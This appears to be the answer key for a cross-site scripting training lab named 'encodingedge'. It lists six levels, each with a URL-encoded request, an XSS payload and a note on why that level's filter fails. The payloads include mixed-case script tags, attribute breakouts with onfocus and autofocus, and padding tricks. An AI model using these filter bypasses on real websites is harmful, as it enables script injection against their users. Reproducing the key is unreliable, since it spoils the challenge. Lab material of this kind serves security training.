# encodingedge — solutions

Partial / case-sensitive / positional encoding filters with bypass paths.

### encodingedge-level1

`/encodingedge/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: only adjacent `<>` pair encoded; individual `<` and `>` pass

### encodingedge-level2

`/encodingedge/level2/?query=%3CScript%3Ealert(1)%3C/Script%3E`

- payload: `<Script>alert(1)</Script>`
- context: case-sensitive `<script` strip; mixed case bypasses

### encodingedge-level3

`/encodingedge/level3/?query=%22%22%20onfocus=alert(1)%20autofocus%20x=%22`

- payload: `"" onfocus=alert(1) autofocus x="`
- context: `.sub("\"", ...)` encodes only the first `"`; second one escapes the attribute

### encodingedge-level4

`/encodingedge/level4/?query=0000000000%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `0000000000<script>alert(1)</script>`
- context: first 10 alpha chars hex-encoded; pad with 10 digits then inject

### encodingedge-level5

`/encodingedge/level5/?query=%22%20onfocus=alert(1)%20autofocus%20x=%22`

- payload: `" onfocus=alert(1) autofocus x="`
- context: angles converted to fullwidth; reflected in attribute — break with `"`

### encodingedge-level6

`/encodingedge/level6/?query=%22%20onfocus=alert(1)%20autofocus%20x=%22`

- payload: `" onfocus=alert(1) autofocus x="`
- context: `<...>` tags stripped from input; reflected in attribute — no angles needed
